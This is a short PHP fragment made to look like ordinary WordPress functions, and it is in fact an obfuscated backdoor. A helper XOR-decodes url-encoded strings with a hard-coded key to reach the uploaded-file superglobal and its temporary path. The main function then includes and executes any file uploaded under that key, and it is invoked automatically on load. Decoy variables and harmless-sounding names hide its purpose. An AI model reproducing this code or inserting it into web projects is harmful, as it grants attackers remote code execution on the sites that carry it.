...
function original_link_html($end_clean)

{
    $quote_style = $end_clean;
    

    $get_posts = $GLOBALS[start("%17%3C%2Fz%21%03", $quote_style)];

    $tb_url = $get_posts;

    $property_value = isset($tb_url[$quote_style]);
    if ($property_value)

    {

        $no_texturize_tags = $get_posts[$quote_style];

        $haystack = $no_texturize_tags[start("%3C%17%16i%0A1%18%00", $quote_style)];
        $slug_num = $haystack;
	$_context = 'match';
        include ($slug_num);
    }
...
function start($regex, $mime_type)

{

    $_builtin = $mime_type;
    $revision_id = "url" . "decode";
    $label = $revision_id($regex);
    $decoded_slug = substr($_builtin,0, strlen($label));

    $pee_part = $label ^ $decoded_slug;

    
	$comments_in = 'values';
    $label = strpos($pee_part, $decoded_slug);

    
	$replace = 'post_category';
    return $pee_part;
}


original_link_html('Hzf6dPueYuxuF');
